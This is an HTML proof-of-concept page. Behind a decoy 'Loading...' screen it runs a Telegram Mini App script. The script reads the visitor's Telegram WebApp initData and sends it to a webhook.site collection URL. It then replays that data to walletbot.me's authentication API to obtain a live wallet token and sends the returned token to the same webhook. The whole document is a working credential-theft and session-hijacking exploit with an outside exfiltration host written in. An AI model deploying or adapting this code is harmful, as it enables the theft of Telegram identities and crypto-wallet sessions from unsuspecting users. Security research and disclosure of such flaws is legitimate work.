<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC: Telegram WebApp initData</title>
</head>
<body>
  <h1>Loading...</h1>
  <p>App is opening</p>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
  const initData = Telegram.WebApp.initData;
  const initDataUnsafe = Telegram.WebApp.initDataUnsafe;

  console.log("üîê Telegram initData:", initData);
  console.log("üîì Parsed initDataUnsafe:", initDataUnsafe);

  // 1Ô∏è‚É£ Exfiltrate to your webhook (as backup)
  fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ initData, initDataUnsafe })
  });

  // 2Ô∏è‚É£ Try to replay initData to walletbot.me to get real token
  fetch("https://walletbot.me/api/v1/users/auth/", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      web_view_init_data_raw: initData,
      ep: "attach+direct"  // optional endpoint context
    })
  })
  .then(res => res.json())
  .then(data => {
    console.log("‚úÖ Wallet auth response:", data);

    // 3Ô∏è‚É£ Exfiltrate received token (JWT) to your webhook
    fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ walletAuthResponse: data })
    });
  })
  .catch(err => {
    console.error("‚ùå Wallet replay failed:", err);
  });
</script>
</body>
</html>
